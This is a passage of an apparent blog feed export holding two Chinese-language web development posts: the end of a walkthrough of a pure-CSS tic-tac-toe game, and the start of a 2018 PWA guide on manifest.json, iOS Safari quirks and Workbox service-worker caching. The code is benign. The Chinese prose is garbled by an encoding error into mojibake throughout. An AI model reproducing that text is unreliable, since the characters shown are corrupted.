#message::before,#cell-6-o:checked ~ #cell-7-o:checked ~ #cell-8-o:checked ~ #end #message::before,#cell-0-o:checked ~ #cell-3-o:checked ~ #cell-6-o:checked ~ #end #message::before,#cell-1-o:checked ~ #cell-4-o:checked ~ #cell-7-o:checked ~ #end #message::before,#cell-2-o:checked ~ #cell-5-o:checked ~ #cell-8-o:checked ~ #end #message::before,#cell-0-o:checked ~ #cell-4-o:checked ~ #cell-8-o:checked ~ #end #message::before,#cell-2-o:checked ~ #cell-4-o:checked ~ #cell-6-o:checked ~ #end #message::before &#123;  content: &quot;Player 2 won!&quot;;&#125;

ä¸¦å°‡å«æœ‰ end class çš„ div è¨­ç‚º display: blockï¼Œç•¶ç„¶ï¼Œä¹Ÿæ˜¯è¦ç¢ºå®šæ‰€æœ‰ checked ç‹€æ…‹éƒ½æ˜¯æ­£ç¢ºçš„ï¼ˆå·²ç¶“çµæŸï¼‰ï¼š
input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ input:checked ~ #end,#cell-0-x:checked ~ #cell-1-x:checked ~ #cell-2-x:checked ~ #end,#cell-3-x:checked ~ #cell-4-x:checked ~ #cell-5-x:checked ~ #end,#cell-6-x:checked ~ #cell-7-x:checked ~ #cell-8-x:checked ~ #end,#cell-0-x:checked ~ #cell-3-x:checked ~ #cell-6-x:checked ~ #end,#cell-1-x:checked ~ #cell-4-x:checked ~ #cell-7-x:checked ~ #end,#cell-2-x:checked ~ #cell-5-x:checked ~ #cell-8-x:checked ~ #end,#cell-0-x:checked ~ #cell-4-x:checked ~ #cell-8-x:checked ~ #end,#cell-2-x:checked ~ #cell-4-x:checked ~ #cell-6-x:checked ~ #end,#cell-0-o:checked ~ #cell-1-o:checked ~ #cell-2-o:checked ~ #end,#cell-3-o:checked ~ #cell-4-o:checked ~ #cell-5-o:checked ~ #end,#cell-6-o:checked ~ #cell-7-o:checked ~ #cell-8-o:checked ~ #end,#cell-0-o:checked ~ #cell-3-o:checked ~ #cell-6-o:checked ~ #end,#cell-1-o:checked ~ #cell-4-o:checked ~ #cell-7-o:checked ~ #end,#cell-2-o:checked ~ #cell-5-o:checked ~ #cell-8-o:checked ~ #end,#cell-0-o:checked ~ #cell-4-o:checked ~ #cell-8-o:checked ~ #end,#cell-2-o:checked ~ #cell-4-o:checked ~ #cell-6-o:checked ~ #end &#123;  display: block;&#125;

ä¸»è¦çš„å¯¦ä½œé‡é»å¤§æ¦‚å°±åˆ°é€™é‚Šï¼Œå‰©ä¸‹é‚„æœ‰ä¸€äº›åƒæ˜¯ radio button è¢« check å¾Œï¼ŒæŠŠåŸæœ‰ label è¨­ç‚º display: none çš„éƒ¨åˆ†å°±æ˜¯ç‚ºäº†è®“ç•«é¢æ›´å¥½çœ‹è€Œå·²ï¼Œå¯¦ä½œæ–¹å¼è·Ÿä¸Šé¢çš„ selector éƒ½å¤§åŒå°ç•°ã€‚
å¯¦ä½œæŠ€å·§æ•´ç†æœ€å¾Œç¨å¾®çµ±æ•´ä¸€ä¸‹å¯¦ä½œçš„æŠ€å·§ï¼š

å¯¦ä½œæŠ€å·§ 1 - å–„ç”¨ form å…ƒç´ ï¼š input[type=radio] èˆ‡ label
åˆ©ç”¨ radio button ä¾†é”æˆåˆ‡æ›ç‹€æ…‹çš„æ“ä½œï¼Œåœ¨å„ç¨®ä»¥ç´” CSS è£½ä½œçš„æ‡‰ç”¨ä¸­ï¼Œå¹¾ä¹æ˜¯å¿…å‚™å‡ºç¾çš„æŠ€å·§ï¼Œé€™é‚Šä¹Ÿä¸ä¾‹å¤–ã€‚
é€é input å…ƒç´ ï¼Œæˆ‘å€‘å¯ä»¥å¾ :check é€™å€‹ Pseudo-class ä¾†åˆ¤æ–·ä½¿ç”¨è€…çš„é»æ“Šèˆ‡å¦ã€‚

å¯¦ä½œæŠ€å·§ 2 - CSS selector å¯ä¸æ˜¯åªæœ‰ id èˆ‡ class
æ´»ç”¨ attribute selector èˆ‡ åƒå…ƒç´ ã€åƒé¡åˆ¥ï¼Œå¯ä»¥å¸¶ä¾†å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„å¦™ç”¨ï¼Œåƒæ˜¯ label[for$=&#39;-o&#39;] èˆ‡ :check ç­‰ç­‰ã€‚

å¯¦ä½œæŠ€å·§ 3 - è—æ±è¥¿ä¸æ˜¯åªèƒ½ç”¨ displayï¼Œé‚„æœ‰ z-index å‘¢
åˆ©ç”¨ z-index çš„éšå±¤é—œä¿‚ï¼Œæ§åˆ¶è§¸ç™¼ hover çš„å…ƒç´ ï¼Œè®“æˆ‘å€‘å¤šäº†ä¸€ç¨®éš±è—ç‰©ä»¶çš„æ–¹å¼ã€‚

å¯¦ä½œæŠ€å·§ 4 - CSS Grid
é›–ç„¶åœ¨å‰é¢ä¸¦æ²’æœ‰æåˆ°ï¼Œä½†ä½œè€…æ˜¯åˆ©ç”¨ CSS Grid ç•«å‡ºè¡¨æ ¼ï¼Œé€™åœ¨ Modern web browser ä¸Šæ˜¯æœ€ç¶“æ¿Ÿå¯¦æƒ çš„æ–¹æ³•ï¼š
&lt;div id=&quot;board&quot; class=&quot;center&quot;&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-0&quot;&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div class=&quot;tile&quot; id=&quot;tile-1&quot;&gt;      &lt;div&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;!--       ...  ä¾æ­¤é¡æ¨å°‡ä¹å€‹æ ¼å­å¡«æ»¿    --&gt;  &lt;/div&gt;

/*... çœç•¥*/#board &#123;  width: 50vmin;  height: 50vmin;  display: grid;  grid-template-columns: 1fr 1fr 1fr;  grid-template-rows: 1fr 1fr 1fr;&#125;#tile-0 &#123;  grid-column: 1;  grid-row: 1;&#125;#tile-1 &#123;  grid-column: 2;  grid-row: 1;&#125;/*... çœç•¥*/

çµè«–æ¯æ¯çœ‹åˆ° codepen ä¸Šä¸€äº›ç¥å¥‡çš„ä½œå“ï¼Œéƒ½æœƒè®“æˆ‘æœ‰ mind-blowing çš„æ„Ÿè¦ºï¼Œé›–ç„¶å¤§å¤šæ™‚å€™é›£ä»¥ç†è§£å¯¦ä½œåŸç†ï¼Œä½†å¶è€Œé‚„æ˜¯æœƒçœ‹åˆ°é¡ä¼¼é€™æ¬¡ç¯„ä¾‹ä¸€èˆ¬ï¼Œå¥½ç†è§£ï¼Œåˆèƒ½å­¸åˆ°ä¸å°‘æŠ€å·§çš„ä½œå“ã€‚å¸Œæœ›å° CSS ä¸é‚£éº¼ç†Ÿæ‚‰çš„è®€è€…ï¼Œé€éé€™æ¬¡çš„åˆ†æï¼Œä¹Ÿèƒ½çœ‹å¾—æ‡‚èƒŒå¾Œçš„åŸç†ï¼Œç„¶å¾Œå°åˆ©ç”¨ CSS ç¹ªåœ–æˆ–æ˜¯è£½ä½œ no-js çš„ä½œå“æœ‰æ‰€èˆˆè¶£ï¼Œé›–ç„¶æ²’ä»€éº¼å¯¦éš›ç”¨é€”ï¼Œä½†æˆ‘è‡ªå·±è¦ºå¾—èƒ½å¤ åˆ©ç”¨å°ˆæ¥­ç©å‡ºä¸€äº›å¥½ç©çš„æ±è¥¿çœŸçš„è »å¸å¼•äººçš„ï¼
è³‡æ–™ä¾†æº
CSS Tic-Tac-Toe - Alvaro Montoro

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>PWA å¯¦æˆ°ç¶“é©—åˆ†äº«</title>
    <url>/2018/10/13/pwa-in-action/</url>
    <content><![CDATA[å‰è¨€å‰äº›æ—¥å­åœ¨å¿™å…¬å¸çš„ç”¢å“æ”¹ç‰ˆï¼Œå¾åŸæœ¬çš„ PHP æ›æˆå¾Œç«¯ Go + å‰ç«¯ React SPAï¼Œåˆ†æˆæ¡Œé¢ç‰ˆè·Ÿæ‰‹æ©Ÿç‰ˆå…©å€‹ä¸åŒçš„ Projectï¼Œè€Œæ—¢ç„¶éƒ½æ”¹ç‰ˆäº†ï¼Œè‡ªç„¶è¦æŠŠæœ€æ–°æœ€æ½®çš„ PWA ä¹Ÿæ”¾åœ¨ç›®æ¨™è£¡é¢ï¼Œä¹‹å‰è€³è PWA å¾ˆä¹…ä½†å»æ²’æœ‰å¯¦ä½œéçš„æˆ‘ä¹Ÿæœ‰äº†æ©Ÿæœƒä¾†å˜—è©¦é€™å€‹æ±è¥¿ã€‚
å¦‚ä»Šç”¢å“å·²ç¶“æ”¹ç‰ˆå®Œç•¢ä¸”ä¸Šç·šäº†å…©ä¸‰å€‹æœˆï¼Œæ…¢æ…¢ç©©å®šä¸‹ä¾†ï¼Œåœ¨å„ªåŒ– PWA çš„éç¨‹ä¸­ä¹Ÿè®“æˆ‘æœ‰äº†ä¸€äº›å¿ƒå¾—å¯ä»¥è®“å¤§å®¶åˆ†äº«ã€‚
åœ¨èˆ‰ä¸€äº›å¯¦éš›æ¡ˆä¾‹ä¹‹å‰ï¼Œå…ˆè®“æˆ‘å€‘ä¾†è«‡è«‡åˆ°åº•æ€æ¨£æ‰ç®—æ˜¯ PWAã€‚
PWA åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿå¾ Google å®˜æ–¹çš„æ–‡ä»¶ï¼šä½ çš„é¦–å€‹ Progressive Web App ä¸­å¯ä»¥çœ‹å‡º PWA çš„ä¸€äº›è©³ç´°å®šç¾©ï¼Œä½†æˆ‘ä¸å¤ªå–œæ­¡é€™ç¨®åˆ¶å¼çš„è¦å‰‡ï¼Œå°æˆ‘ä¾†èªªï¼ŒPWA å°±æ˜¯ä¸€å€‹å¾ˆåƒ Native App çš„ Web Appï¼Œè€Œå…¶ä¸­ç€è¦½å™¨çš„æ”¯æ´ä¹Ÿä½”äº†å¾ˆå¤§çš„ä¸€éƒ¨åˆ†ã€‚
åœ¨ä»¥å¾€å„˜ç®¡ä½ çš„ç¶²ç«™åšå¾—å†æ€éº¼åƒ Native Appï¼Œä½ é‚„æ˜¯æœ‰å…©å€‹é›£é—œæ²’è¾¦æ³•å…‹æœï¼šé›¢ç·šçš„æ™‚å€™å°± GG ä»¥åŠæ²’è¾¦æ³•å®‰è£åœ¨æ‰‹æ©Ÿä¸Šï¼Œæ‰€ä»¥ä¸ç®¡æ€éº¼çœ‹ï¼Œäººå®¶éƒ½çŸ¥é“ä½ å°±æ˜¯å€‹ Web Appï¼Œæ°¸é éƒ½ä¸æœƒé•·å¾—åƒ Nativeã€‚
å¯æ˜¯è‡ªå¾ç€è¦½å™¨é–‹å§‹æ”¯æ´ Service Worker ä»¥åŠ manifest ä¹‹å¾Œï¼Œä¸Šé¢é€™å…©é»å°±è¢«å…‹æœäº†ï¼å¾—ç›Šæ–¼ Service Workerï¼Œè®“ç¶²é é›¢ç·šçš„æ™‚å€™ä¹Ÿèƒ½å¤ é‹ä½œï¼Œå¯ä»¥è‡ªå·±å¯« code ä¾†æ±ºå®šè¦æ¸²æŸ“ä»€éº¼ç•«é¢ï¼›è€Œç€è¦½å™¨çš„ã€Œæ–°å¢åˆ°ä¸»ç•«é¢ã€çš„åŠŸèƒ½æ›´æ˜¯è®“å®‰è£ Web App æˆç‚ºå¯èƒ½ï¼Œé–‹ç™¼è€…ä¹Ÿå¯ä»¥ç”¨ manifest.json ä¾†è‡ªè¨‚ä¸€äº›å…§å®¹ï¼Œåƒæ˜¯å•Ÿå‹•ç•«é¢ä»¥åŠå®‰è£åœ¨ä¸»ç•«é¢ä¸Šçš„åç¨±ç­‰ç­‰ã€‚
å°æˆ‘ä¾†èªªï¼Œå¦‚æœä½ èƒ½å¤ åˆ©ç”¨ä¸Šé¢é€™å…©é …æŠ€è¡“ï¼Œè®“ä½ çš„ Web App æˆåŠŸå®‰è£åœ¨æ‰‹æ©Ÿä¸Šä¸¦ä¸”çœ‹èµ·ä¾†è·Ÿ Native App æ²’å…©æ¨£ï¼Œæˆ‘è¦ºå¾—å°±èƒ½ç¨±ä½œæ˜¯ PWAã€‚
æˆ‘åœ¨ä¹‹å‰çš„æ–‡ç« ï¼ˆåŸä¾† CORS æ²’æœ‰æˆ‘æƒ³åƒä¸­çš„ç°¡å–®ï¼‰å·²ç¶“æœ‰åˆ†äº«é PWA åœ¨æ‰‹æ©Ÿä¸Šé¢çš„æ¨£å­äº†ï¼Œé€™é‚Šå°±ä¸å†è´…è¿°ã€‚é‚„è¨˜å¾—æˆ‘ç¬¬ä¸€æ¬¡é«”é©—å®‰è£ PWA çš„æ™‚å€™ä¹Ÿè¢«åš‡åˆ°äº†ï¼Œå› ç‚ºçœ‹èµ·ä¾†å°±è·Ÿ Native App æ²’å…©æ¨£ï¼Œå¦‚æœçœŸçš„åšå¾—å¥½ï¼Œæ‡‰è©²æ˜¯å¾ˆé›£å€åˆ†å‡ºä¾†çš„ã€‚æ˜æ˜æ˜¯å€‹ç¶²é å¯æ˜¯çœ‹èµ·ä¾†å»è·Ÿ Native App ä¸€æ¨£ï¼Œé€™å°±æ˜¯ PWAã€‚
æ¥è‘—ä¾†ä»‹ç´¹å¹¾å€‹ PWA çš„é‡è¦å› ç´ ï¼Œä½ è¦åš PWA å°±ä¸€å®šè¦æœ‰ä¸‹é¢å¹¾å€‹æ±è¥¿ã€‚
manifest.jsoné¦–å…ˆå…ˆä¾†è«‡manifest.jsonï¼Œæœ‰å¯«é Android çš„éƒ½çŸ¥é“æœ‰å€‹æ±è¥¿å«åšAndroidManifest.xmlï¼Œå…¶å¯¦å…©å€‹æœ¬è³ªä¸Šæ˜¯ä¸€æ¨£çš„æ±è¥¿ï¼Œå°±æ˜¯å»æè¿°é€™å€‹ App çš„ä¸€äº›ç‰¹æ€§ã€‚
æˆ‘å€‘å…ˆä¾†çœ‹çœ‹ Google å®˜æ–¹æ–‡ä»¶ï¼šThe Web App Manifestè£¡é¢çµ¦çš„ç¯„ä¾‹ï¼š
&#123;  &quot;short_name&quot;: &quot;Maps&quot;,  &quot;name&quot;: &quot;Google Maps&quot;,  &quot;icons&quot;: [    &#123;      &quot;src&quot;: &quot;/images/icons-192.png&quot;,      &quot;type&quot;: &quot;image/png&quot;,      &quot;sizes&quot;: &quot;192x192&quot;    &#125;,    &#123;      &quot;src&quot;: &quot;/images/icons-512.png&quot;,      &quot;type&quot;: &quot;image/png&quot;,      &quot;sizes&quot;: &quot;512x512&quot;    &#125;  ],  &quot;start_url&quot;: &quot;/maps/?source=pwa&quot;,  &quot;background_color&quot;: &quot;#3367D6&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;scope&quot;: &quot;/maps/&quot;,  &quot;theme_color&quot;: &quot;#3367D6&quot;&#125;

è£¡é¢çµ¦çš„è³‡è¨Šå¾ˆç°¡å–®ï¼Œç„¶å¾Œæœƒè·Ÿä½ æŠŠ PWA æ–°å¢åˆ°ä¸»ç•«é¢æ™‚å‡ºç¾çš„æ±è¥¿æ¯æ¯ç›¸é—œã€‚nameçš„è©±å°±æ˜¯ä½  App çš„åç¨±ï¼Œä»–åœ¨ä¸»ç•«é¢ä¸Šé¢å°±æœƒé¡¯ç¤ºé€™å€‹nameï¼Œä½†å¦‚æœä½ ä¹Ÿæœ‰æä¾›short_nameçš„è©±æœƒå„ªå…ˆä½¿ç”¨short_nameã€‚
å†ä¾†iconså°±æ˜¯ä¸»ç•«é¢ä¸Šé¢æœƒå‡ºç¾çš„ logo å›‰ï¼Œé€™æ²’ä»€éº¼å¥½å¤šè«‡çš„ã€‚start_urlå‰‡æ˜¯ä½ å¾ä¸»ç•«é¢ä¸Šé–‹å•Ÿæ™‚æœƒé€£ç·šåˆ°çš„åœ°æ–¹ï¼Œå¾ˆå¤šäººæœƒåŠ å€‹?source=pwaä¹‹é¡çš„ï¼Œé€™æ¨£å°±å¯ä»¥çŸ¥é“é€™å€‹ä½¿ç”¨è€…æ˜¯ä½¿ç”¨ PWAï¼Œæ–¹ä¾¿åšä¸€äº›çµ±è¨ˆã€‚
é€™é‚Šæœ‰å€‹å°åœ°æ–¹è¦æ³¨æ„ï¼Œé‚£å°±æ˜¯åœ¨æŸä¸€ç‰ˆçš„ iOS Safariï¼ˆæŠ±æ­‰æˆ‘å¿˜è¨˜æ˜¯å“ªä¸€ç‰ˆï¼Œä½†ç¸½ä¹‹æœ€æ–°çš„å·²ç¶“æ²’æœ‰é€™å€‹å•é¡Œäº†ï¼‰ï¼Œå®ƒæ˜¯ä¸æœƒéµå®ˆstart_urlçš„ï¼ä»–æœƒæ ¹æ“šçš„æ˜¯ä½ åœ¨å®‰è£ PWA æ™‚çš„ç¶²å€ï¼Œä¾‹å¦‚èªªä½ åœ¨https://example.com/test/123çš„æ™‚å€™æŒ‰ä¸‹ã€Œæ–°å¢åˆ°ä¸»ç•«é¢ã€ï¼Œä½ åœ¨ä¸»ç•«é¢é–‹å•Ÿ PWA æ™‚å°±æœƒé€£ç·šåˆ°é€™å€‹ç•«é¢ã€‚
é€™éƒ¨åˆ†å…¶å¯¦æ»¿å›°æ“¾çš„ï¼Œä½†å¹¸å¥½æœ€æ–°çš„ iOS Safari å·²ç¶“æ²’æœ‰é€™å€‹å•é¡Œäº†ï¼Œå¤§å®¶å¯ä»¥ä¸ç”¨æ“”å¿ƒã€‚
é‚„æœ‰ä¸€å€‹è¦ç‰¹åˆ¥æçš„å°±æ˜¯nameã€background_colorè·Ÿiconæœƒè‡ªå‹•çµ„æˆSplash screensï¼Œå°±æ˜¯ä½ åœ¨æ‰“é–‹ PWA çš„æ™‚å€™æœƒçœ‹åˆ°çš„ä¸€å€‹ç•«é¢ï¼Œæ˜¯ç”±é€™ä¸‰å€‹è³‡è¨Šè‡ªå‹•è¢« Chrome æ‰€çµ„æˆçš„ï¼Œæ„æ€å°±æ˜¯ä½ æ²’è¾¦æ³•å®¢è£½åŒ–é€™å€‹å•Ÿå‹•ç•«é¢ã€‚
å®ƒå°±æ˜¯æœƒé¡¯ç¤ºä½ æŒ‡å®šçš„èƒŒæ™¯é¡è‰²ã€ç„¶å¾Œä¸­é–“æ”¾ä¸€å€‹ icon ä¸‹é¢æ”¾ä½  App çš„åç¨±ï¼Œæ²’æœ‰å…¶ä»–æ±è¥¿å¯ä»¥èª¿äº†ï¼Œè‡³å°‘ç¾åœ¨æ˜¯é€™æ¨£ã€‚
åœ¨é€™é»ä¸Šé¢ iOS å°±ä¸ä¸€æ¨£ï¼ŒiOS æ˜¯ä¸æ”¯æ´é€™ç¨®å•Ÿå‹•ç•«é¢çš„ï¼Œä½†å¥½è™•å°±æ˜¯ä½ å¯ä»¥è‡ªå·±é€é html çš„ tag ä¾†è¨­å®šï¼
&lt;link    rel=&#x27;apple-touch-startup-image&#x27;    href=&#x27;/assets/splash/splash-1125x2436.png&#x27;    media=&#x27;(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)&#x27;/&gt;

æœƒæœ‰ä¸€äº›å°ºå¯¸ç›¸é—œçš„è¨­å®šä½ å› ç‚ºè¦å¹«æ¯ä¸€ç¨®ä¸åŒçš„ device éƒ½æº–å‚™ä¸€å¼µåœ–ç‰‡ï¼Œè©³æƒ…å¯åƒè€ƒï¼šProgressive Web App Splash Screens æˆ–æ˜¯ Few Tips That Will Make Your PWA on iOS Feel Like Nativeã€‚
iOS è·Ÿ Android çš„å·®åˆ¥åœ¨æ–¼ iOS çš„å•Ÿå‹•ç•«é¢ä½ å¯ä»¥æ”¾ä¸€å¼µåœ–ç‰‡ï¼Œå› æ­¤å¯ä»¥å®Œå…¨å®¢è£½åŒ–ï¼Œä½ æƒ³æ”¾ä»€éº¼å°±æ”¾ä»€éº¼ï¼Œè‡ªç”±åº¦æ¯” Android ä¾†å¾—é«˜ã€‚
é‚„æœ‰å°±æ˜¯ icon çš„éƒ¨åˆ†ï¼ŒiOS ä¹Ÿä¸æœƒçœ‹ä½ mainfest.jsonçš„è¨­å®šï¼Œè€Œæ˜¯æœƒçœ‹è‡ªå·±çš„ html tagï¼Œæ‰€ä»¥ä½ å¿…é ˆé¡å¤–è¨­ç½®çµ¦ iOS ä½¿ç”¨çš„ iconï¼š
&lt;link    rel=&#x27;apple-touch-icon&#x27;    sizes=&#x27;192x192&#x27;    href=&#x27;/assets/favicons/iOS192x192.png&#x27;/&gt;

å°æ–¼manifest.jsonï¼Œè©²æ³¨æ„çš„é»å·®ä¸å¤šå°±é€™äº›ã€‚å…¶å¯¦æœ€å¤§çš„å•é¡Œé‚„æ˜¯æ”¯æ´åº¦ï¼Œæ‰€ä»¥ Google å‡ºäº†ä¸€å€‹PWACompatï¼Œå¯ä»¥è‡ªå‹•å¹«ä½ é‡å°èˆŠçš„ç€è¦½å™¨èª¿æ•´ä½ çš„æª”æ¡ˆä»¥åŠ html çš„ tagï¼Œä¸éä¹Ÿæœ‰äººå¯«äº†ä¸€ç¯‡ï¼šYou shouldnâ€™t use Chromeâ€™s PWACompat library in your Progressive Web Apps ä¾†å‘Šè¨´å¤§å®¶ä¸è¦ç”¨ï¼Œè«–é»å¤§æ¦‚æ˜¯ä¸èƒ½é€™æ¨£ä¸€æ¦‚è«–ä¹‹ï¼Œä½ å¿…é ˆé‡å°æ¯ç¨®ä¸åŒçš„å¹³å°è·Ÿç€è¦½å™¨å»äº†è§£ä»–çš„å·®ç•°å†ä¾†åšé©é…ï¼Œæ‰èƒ½å¾—åˆ°æœ€å¥½çš„ä½¿ç”¨è€…é«”é©—ï¼Œé€™ç¨®çµ±ä¸€èª¿æ•´çš„åšæ³•æœƒåœ¨å¾ˆå¤šåœ°æ–¹çœ‹èµ·ä¾† ok ä½†æ˜¯æ€ªæ€ªçš„ã€‚
æ—¢ç„¶ä¸Šé¢éƒ½æåˆ° iOS äº†ï¼Œå°±ä¾†è¬›è¬› iOS çš„ä¸€äº›ä¸åŒä¹‹è™•ã€‚å…¶å¯¦ iOS é–‹å§‹æä¾› PWA çš„æ”¯æ´æ˜¯ä»Šå¹´ï¼ˆ2018 å¹´ï¼‰çš„äº‹æƒ…è€Œå·²ï¼Œè€Œä¸”å‰›æ¨å‡ºçš„æ™‚å€™æ”¯æ´åº¦æ»¿å·®çš„ï¼Œä¸éæœ‰åœ¨æ…¢æ…¢æ”¹å–„å°±æ˜¯äº†ã€‚
é—œæ–¼é‚£äº› iOS ä¸åŒçš„åœ°æ–¹ï¼Œé€™å…©ç¯‡æ–‡ç« éƒ½è¬›å¾—å¾ˆæ¸…æ¥šäº†ï¼šPWAs are coming to iOS 11.3: Cupertino, we have a problemã€Progressive Web Apps on iOS are here ğŸš€ã€‚
æœ€å¤§çš„å·®ç•°ä¹‹ä¸€å¤§æ¦‚å°±æ˜¯å¾ˆå¤šæ™‚å€™éƒ½ä¸çœ‹manifest.jsonï¼Œä½ è¦è‡ªå·±é¡å¤–è¨­ç½®ä¸€äº›ç›¸å°æ‡‰çš„ html tag æ‰æœ‰ç”¨ï¼Œé€™é»æ˜¯è¦ç‰¹åˆ¥æ³¨æ„çš„ã€‚
å†ä¾†å°±æ˜¯&lt;meta name=â€apple-mobile-web-app-capableâ€ content=â€yesâ€&gt;é€™å€‹ tag ä¹Ÿå¾ˆé‡è¦ï¼Œä¸»è¦æ˜¯å‘Šè¨´ç€è¦½å™¨èª¬ï¼šã€Œæˆ‘æº–å‚™å¥½æä¾›å…¨è¢å¹•çš„é«”é©—äº†ï¼Œå°±ç®—éš±è—ç€è¦½å™¨çš„ UI ä¹Ÿæ²’é—œä¿‚ã€ï¼Œè€Œé€™ç¯‡ï¼šDonâ€™t use iOS meta tags irresponsibly in your Progressive Web Apps å‰‡å‘Šè¨´ä½ åƒè¬ä¸è¦æ¿«ç”¨é€™å€‹ tagï¼Œä¸ç„¶ä½ çš„ Web App åœ¨ Safari ä¸Šçš„é«”é©—æœƒè®Šå¾—å¾ˆå·®ï¼Œå› ç‚ºå¾ˆå¤šæ±è¥¿éƒ½ä¸æ”¯æ´ã€‚
è‡³æ–¼ Safari æœ€å¤§çš„ä¸€é»å•é¡Œæˆ‘ç›´æ¥å¼•ç”¨ä¸Šé¢ PWAs are coming to iOS 11.3: Cupertino, we have a problem çš„å…¶ä¸­ä¸€æ®µï¼š

Also, itâ€™s a massive problem for apps with two-factor authentication, such as Twitter. If you need to go to another app to get a token or to open a text message or an email, you will get out of the PWA. When you go back to paste the code, you are out of context and, you need to start the login process again losing the validity of that code. It happened to me on Twitter! Which means, the Twitter PWA on iOS is completely unusable for me.

é€™æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿæˆ‘ç›´æ¥èˆ‰ä¸€å€‹å¯¦éš›ç¯„ä¾‹ï¼Œå‡å¦‚ä½ çš„ PWA æœ‰æä¾› Facebook ç™»å…¥çš„åŠŸèƒ½è€Œä¸”æ˜¯ç”¨é‡æ–°å°å‘çš„æ–¹å¼ï¼Œä½ ä¸€é»ä¸‹å»ä»–å°±æœƒé–‹ä¸€å€‹æ–°çš„ Safari è¦–çª—é€£åˆ° Facebook è®“ä½ æˆæ¬Šï¼Œå¯æ˜¯ç•¶ä½ æˆæ¬Šå®Œä¹‹å¾Œå›åˆ° PWAï¼Œä½ æœƒç™¼ç¾ä»€éº¼äº‹æƒ…éƒ½æ²’ç™¼ç”Ÿã€‚
é€™ä¸€é»çœŸçš„è¶…å‚·ï¼Œè€Œä¸”ç¾åœ¨æ‡‰è©²éƒ½é‚„æ²’ä¿®å¥½ï¼Œåªèƒ½æœŸå¾… Safari ä¹‹å¾ŒæœƒæŠŠå•é¡Œä¿®æ‰äº†ã€‚è€Œ Android Chrome å‰‡æ˜¯æœƒåœ¨åŒä¸€å€‹è¦–çª—åº•ä¸‹æ‰“é–‹ Facebookï¼Œå› æ­¤çµæŸä¹‹å¾Œèƒ½å¤ é †åˆ©å®Œæˆç™»å…¥æµç¨‹ã€‚
æœ‰é—œæ–¼ iOS çš„å•é¡Œè·Ÿmanifest.jsonçš„æ³¨æ„äº‹é …å·®ä¸å¤šå°±åˆ°é€™é‚Šï¼Œå†ä¾†æˆ‘å€‘è«‡è«‡ PWA çš„ç¬¬äºŒå€‹é‡é»ï¼šService Workerã€‚
Service WorkeråŠ å…¥ Service Worker çš„ç›®çš„å°±åªæœ‰ä¸€å€‹ï¼Œé‚£å°±æ˜¯å¿«å–ã€‚é€é Service Workerï¼ˆä»¥ä¸‹ç°¡ç¨± SWï¼‰ï¼Œå¯ä»¥å¹«åŠ©æˆ‘å€‘åœ¨ç™¼é€ request ä¹‹å‰å°±å…ˆæ””æˆªåˆ°ä¸¦ä¸”åšè™•ç†ï¼Œè€Œé›¢ç·šé‹è¡Œçš„åŸç†ä¹Ÿæ˜¯é€™æ¨£çš„ï¼Œæˆ‘å€‘å…ˆåœ¨ç¬¬ä¸€æ¬¡é–‹å•Ÿæ™‚è¨»å†Š SWï¼Œä¸¦ä¸”åˆ©ç”¨ SW ä¸‹è¼‰éœæ…‹æª”æ¡ˆä¸¦å¿«å–ä½ï¼Œä¹‹å¾Œè‹¥ä½¿ç”¨è€…é›¢ç·šï¼Œæˆ‘å€‘å†ç”¨å·²ç¶“å¿«å–ä½çš„æª”æ¡ˆä¾†å›è¦†ï¼Œå°±ä¸æœƒç™¼é€çœŸçš„ requestï¼Œè‡ªç„¶ä¹Ÿä¸æœƒç™¼ç”Ÿç„¡æ³•é€£ç·šçš„æƒ…æ³ã€‚
è€Œ Google æœ‰æä¾›äº†ä¸€å€‹æ–¹ä¾¿çš„å·¥å…·ï¼šWorkbox ä¾†å¹«åŠ©æˆ‘å€‘è‡ªå‹•ç”¢ç”Ÿå‡º SW ä»¥åŠåˆ©ç”¨æ›´æ–¹ä¾¿çš„èªæ³•ä¾†æ””æˆª requestã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘è‡ªå·±ç”¨çš„æ˜¯ Webpack çš„ pluginï¼š
new workboxPlugin.InjectManifest(&#123;    swSrc: path.join(__dirname, &#x27;..&#x27;, SRC_DIR, &#x27;sw.js&#x27;),    swDest: path.join(__dirname, &#x27;..&#x27;, DIST_DIR, &#x27;sw.js&#x27;),    globDirectory: path.join(__dirname, &#x27;..&#x27;, DIST_DIR),    globPatterns: [&#x27;**/*.&#123;js,css&#125;&#x27;]&#125;),  //sw.jslet precacheList = self.__precacheManifest || []workbox.precaching.precacheAndRoute(precacheList)

åªè¦é€™æ¨£ä¸€å¯«ï¼Œå°±æœƒè‡ªå‹•å»æ‰¾ç¬¦åˆè¦å‰‡çš„æª”æ¡ˆä¸¦ä¸”åŠ å…¥å¿«å–æ¸…å–®è£¡é¢ï¼Œä½ åªè¦ä¸€è¨»å†Š SW çš„æ™‚å€™å°±æœƒæŠŠé‚£äº›æª”æ¡ˆçµ¦å¿«å–èµ·ä¾†ã€‚
é™¤æ­¤ä¹‹å¤–å‘¢ï¼ŒWorkbox ä¹Ÿå¯ä»¥é‡å° URL ä¾†ç›£è½ï¼š
// sw.jsworkbox.routing.registerRoute(/(https?:\/\/)(.*)\/api\/(.*)/, args =&gt;    workbox.strategies        .networkFirst(&#123;            cacheName: &#x27;data-cache&#x27;,            plugins: [                new workbox.expiration.Plugin(&#123;                    maxEntries: 100,                    maxAgeSeconds: 2592000                &#125;)            ]        &#125;)        .handle(args)        .then(response =&gt; &#123;            return response        &#125;)        .catch(err =&gt; &#123;            console.log(&#x27;err:&#x27;, err)        &#125;))

